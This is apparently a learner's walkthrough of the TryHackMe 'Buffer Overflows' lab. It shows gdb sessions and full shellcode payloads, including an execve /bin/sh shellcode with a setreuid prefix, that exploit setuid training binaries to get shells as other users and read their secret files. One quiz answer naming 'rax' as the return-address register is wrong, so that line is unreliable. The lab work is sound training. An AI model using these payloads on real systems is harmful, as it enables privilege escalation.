# Buffer Overflows [TryHackMe]

<sub>_As an aspiring Red Teamer this room is quite important to me as it touches on important low level topics that I don't understand. The room's introductory section states that it doesn't teach buffer overflows from scratch, which is a bummer, but I will try to use Gen AI to possibly make sense of every single bit and piece of this walkthrough and include it in this document. This entire document will be structured based on the THM room's structure. I will link to all possible docs I can find around this and will try to include a list of references at the end._</sub> 

## _Process Layout_

Where is dynamically allocated memory stored?

- __heap__

Where is information about functions(e.g. local arguments) stored?

- __stack__

## _x86-64 Procedures_

what direction does the stack grown(l for lower/h for higher)

- __l__

what instruction is used to add data onto the stack?

- __`push`__

## _Procedures Continued_

What register stores the return address?

- __`rax`__

## _Overwriting Variables_

Let's run the program in `overflow-1` directory:

```
cd overflow-1
ls

int-overflow.c  int-overflow

./int-overflow
```

Add 10 characters in the input:

```
AAAAAAAAAA

Try again?
```

Adding one character and trying again results in 15 total characters overwriting the variable:

```
./int-overflow
AAAAAAAAAAAAAAA
You have changed the value of the variable
```

What is the minimum number of characters needed to overwrite the variable?

- __15__

## _Overwriting Function Pointers_

For this exercise let's load `func-pointer` function in `overflow-2` directory into the `gdb`:

```
gdb func-pointer
```

Typing `help` outputs the following:

```
(gdb) help
List of classes of commands:

aliases -- Aliases of other commands
breakpoints -- Making program stop at certain points
data -- Examining data
files -- Specifying and examining files
internals -- Maintenance commands
obscure -- Obscure features
running -- Running the program
stack -- Examining the stack
status -- Status inquiries
support -- Support facilities
tracepoints -- Tracing of program execution without stopping the program
user-defined -- User-defined commands

Type "help" followed by a class name for a list of commands in that class.
Type "help all" for the list of all commands.
Type "help" followed by command name for full documentation.
Type "apropos word" to search for commands related to "word".
Command name abbreviations are allowed if unambiguous.
```

As we know from the source code, the buffer expects up to 14 characters (including `\0` at the end). So inputing 14 characters (or 15 including `\0`) causes a segmentation fault:

```
(gdb) run
Starting program: /home/user1/overflow-2/func-pointer
Missing separate debuginfos, use: debuginfo-install glibc-2.26-64.amzn2.0.3.x86_64
AAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x00007fffffffeb37 in ?? ()
```

It still doesn't seem to be overflowing any memory, so after a bit of research, thanks to the following [write-up](https://medium.com/@cyberlarry/walkthrough-tryhackme-buffer-overflows-task-7-overwriting-function-pointers-ac1336979261) I found out, that we need to "unset some environment variables in order to use the same memory addresses inside and outside `gdb`:

```
(gdb) set exec-wrapper env -u LINES -u COLUMNS
```

Now, let's try again:

```
(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user1/overflow-2/func-pointer
AAAAAAAAAAAAAA

Program received signal SIGILL, Illegal instruction.
0x00007fffffffeb6a in ?? ()
```

No overflow, but we got an `Illegal instruction` message. Let's add one more `A` and see what happens:

```
(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user1/overflow-2/func-pointer
AAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x0000000000400041 in ?? ()
```

And we got a segmentation fault with one character overflow `41` (in hex `41` is `A` in ASCII). Now to find out the memory address we need to access to call `special()` function, we need to disassemble it:

```
Dump of assembler code for function special:
   0x0000000000400567 <+0>:     push   %rbp
   0x0000000000400568 <+1>:     mov    %rsp,%rbp
   0x000000000040056b <+4>:     mov    $0x400680,%edi
   0x0000000000400570 <+9>:     callq  0x400460 <puts@plt>
   0x0000000000400575 <+14>:    mov    $0x40069d,%edi
   0x000000000040057a <+19>:    callq  0x400460 <puts@plt>
   0x000000000040057f <+24>:    nop
   0x0000000000400580 <+25>:    pop    %rbp
   0x0000000000400581 <+26>:    retq
End of assembler dump.
```

If we assume that 14 characters overflow the stack into the register with the return address, all we need to do is send 14 characters followed by the memory address of the special function. Let's try the first address from the dump (reversed, because it's little endian):

```
(gdb) run <<< $(python -c "print('A'*14+'\x67\x05\x40')")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user1/overflow-2/func-pointer <<< $(python -c "print('A'*14+'\x67\x05\x40')")
this is the special function
you did this, friend!
[Inferior 1 (process 19029) exited normally]
```

## _Buffer Overflows_

Go to `overflow-3` directory and list contents:

```
cd overflow-3
ls
```

Looks like there's a `secret.txt` file but we can't read it:

```
[user1@ip-10-10-214-67 overflow-3]$ cat secret.txt
cat: secret.txt: Permission denied
```

Let's see why:

```
[user1@ip-10-10-214-67 overflow-3]$ ls -l
total 20
-rwsrwxr-x 1 user2 user2 8264 Sep  2  2019 buffer-overflow
-rw-rw-r-- 1 user1 user1  285 Sep  2  2019 buffer-overflow.c
-rw------- 1 user2 user2   22 Sep  2  2019 secret.txt
```

Apparently it belongs to `user2` as does the `buffer-overflow` binary. Which means, if we can exploit the binary, we can read `secret.txt`. 

With the help of this [write-up](https://shamsher-khan-404.medium.com/buffer-overflows-tryhackme-writeup-348aec9c1dfe) I found out that buffer overflow is possible by:

```
gdb -q buffer-overflow
```

And then:

```
(gdb) run $(python -c "print('A'*158)")
Starting program: /home/user1/overflow-3/buffer-overflow $(python -c "print('A'*158)")
Missing separate debuginfos, use: debuginfo-install glibc-2.26-64.amzn2.0.3.x86_64
Here's a program that echo's out your input
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x0000414141414141 in ?? ()
```

Trying to understand how many `A`s it takes to overflow with one `41` I went backward and ound it's 153:

```
(gdb) run $(python -c "print('A'*153)")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user1/overflow-3/buffer-overflow $(python -c "print('A'*153)")
Here's a program that echo's out your input
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x0000000000400041 in ?? ()
```

So we know how many bytes it takes to get to the return address, but we don't know how long it is. So adding up to 159 `A`s results in overflowing until 159, which means the return address is 6 bytes long.

So let's start by generating a shellcode:

```
msfvenom -p linux/x64/exec CMD="/bin/bash -p" -f c
```

Find out the length of the shellcode:

```
python -c "shellcode='\x48\x31\xc9...\x9a\xe1\xde';print(len(shellcode))"
```

It's 50. So we need to add enough NOPs to front and back of it and send it to the binary to overwrite return address and then find out where the first NOP's address is located:

```
(gdb) run $(python -c "print('\x90'*51+'\x48\x31\xc9 ... \x9a\xe1\xde'+'\x90'*16+'B'*6)")
Starting program: /home/user1/overflow-3/buffer-overflow $(python -c "print('\x90'*17+'\x48\x31\xc9 ... \x9a\xe1\xde'+'\x90'*16+'B'*6)")
Missing separate debuginfos, use: debuginfo-install glibc-2.26-64.amzn2.0.3.x86_64
Here's a program that echo's out your input
gpuٔHHruH1X'H-\Sls+N
   `#=v,lX-l^䫄ĒZu:Qh8}pBBBBBB

Program received signal SIGSEGV, Segmentation fault.
0x0000424242424242 in ?? ()
```

As we can see the return address is successfully overwritten by 6 `B`s (`42`). Now we need to find where the first `NOP` appears:

```
(gdb) x/100x $rsp-200
0x7fffffffe8f8: 0xffffecf8      0x00007fff      0x90909090      0x90909090
```

Now we need to modify our payload to point to that exact memory address (reversed, cause little endian):

```
python -c "print('\x90'*26+'\xdb\xc8\xd9\x74\x24\xf4\x5e\xbf\x0e\xeb\x66\x12\x2b\xc9\xb1\x13\x31\x7e\x18\x83\xc6\x04\x03\x7e\x1a\x09\x93\x78\x29\x95\xc5\x2f\x4b\x4d\xdb\xac\x1a\x6a\x4b\x1c\x6f\x1d\x8c\x0a\xa0\xbf\xe5\xa4\x37\xdc\xa4\xd0\x61\x23\x49\x21\x0e\x42\x3d\x01\xff\xec\xd2\x2c\x9a\xc3\x59\xdc\x01\x6e\x93\x0d\xa6\xf8\xb6\x23\x5e\x69\x56\xb3\xb3\x42\x87\x48\xae\xc7\xa5\xcb\x44\x26\x3e\x6c\xd0\x36\xe9\xdf\x91\xd6\xd8\x60'+'\x90'*26+'\x08\xe9\xff\xff\xff\x7f')"
```

Despite a lot of different ways and iterations of trying this, this doesn't work, so I went with the write-up's [way](https://www.arsouyes.org/articles/2019/54_Shellcode) of generating this shellcode:

```
'\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05'
```

So: 

```
python3
shellcode = '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05'
len(shellcode)
40
```

Therefore: 

```
./buffer-overflow $(python -c "print('\x90'*90 + '\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05' + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + '\x90'*8 + '\x98\xe2\xff\xff\xff\x7f')")
```

And we got the shell, `whoami` returns `user2`:

```
cat secret.txt
omgyoudidthissocool!!
```

## _Buffer Overflows 2_

This has to go much the same way as the previous task. The source code is telling us that allocated buffer is 154 bytes, but it's filled with `doggo`, so that makes it 149 bytes. I started counting upward from there, until the overflow occurred and the offset beyond which the overflow occurs is 163:

```
(gdb) run $(python -c "print('A'*164)")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user1/overflow-4/buffer-overflow-2 $(python -c "print('A'*164)")
new word is doggoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x0000000000400041 in ?? ()
```

And after adding more bytes to it, we can see that the return address for this is also 6 bytes long. So let's use the shellcode we used previously and see where it starts:

```
(gdb) run $(python -c "print('\x90'*90+'\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05'+'\x90'*33+'A'*6)")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user1/overflow-4/buffer-overflow-2 $(python -c "print('\x90'*90+'\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05'+'\x90'*33+'A'*6)")
new word is doggoj;XH1I//bin/shAPHRWHj<XH1AAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x0000414141414141 in ?? ()
```

So this offset works well enough, now let's see where the first NOP characters end and shellcode starts in memory:

```
(gdb) x/100x $rsp-200
...
0x7fffffffe938: 0x90909090      0x6a909090      0x3148583b      0x2fb849d2
0x7fffffffe948: 0x6e69622f      0x4968732f      0x4108e8c1      0xe7894850
```

So our memory address (last 6 bytes) will be `\x38\xe9\xff\xff\xff\x7f`:

```
(gdb) run $(python -c "print('\x90'*90+'\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05'+'\x90'*33+'\xe8\xe8\xff\xff\xff\x7f')")
Starting program: /home/user1/overflow-4/buffer-overflow-2 $(python -c "print('\x90'*90+'\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05'+'\x90'*33+'\x38\xe9\xff\xff\xff\x7f')")
new word is doggoj;XH1I//bin/shAPHRWHj<XH1
process 13597 is executing new program: /usr/bin/bash
sh-4.2$ whoami
Detaching after fork from child process 13600.
user1
```

This does return a shell, but it's `user1`'s. Let's see what is the user id for the user who owns this binary and `secret.txt`:

```
[user1@ip-10-10-140-244 overflow-4]$ id user3
uid=1003(user3) gid=1003(user3) groups=1003(user3)
```

We can use `pwntools` to generate a shellcode with SETREUID:

```
pwn shellcraft -f d amd64.linux.setreuid 1003
```

The returned byte sequence is: 

```
\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05
```

This code is 14 bytes long. We need it to precede our original shellcode:

```
python -c "print('\x90'*90+'\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05'+'\x90'*19+'\x38\xe9\xff\xff\xff\x7f')"
```

And we got the shell:

```
[user1@ip-10-10-140-244 overflow-4]$ ./buffer-overflow-2 $(python -c "print('\x90'*90+'\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05'+'\x90'*19+'\x38\xe9\xff\xff\xff\x7f')")
new word is doggo1fjqXHj;XH1I//bin/shAPHRWHj<XH18
sh-4.2$ whoami
user3
sh-4.2$ cat secret.txt
wowanothertime!!
sh-4.2$
```
